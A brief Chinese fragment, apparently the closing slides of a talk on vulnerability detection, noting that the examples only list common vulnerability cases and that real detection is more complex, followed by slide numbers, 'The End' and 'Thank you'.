+仅仅罗列了一些常见的漏洞情况，实际上检测难度将比这个代码复杂的多了，这就要求我们对程序有足够的了解。
+39
+完
+谢谢！
+40 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
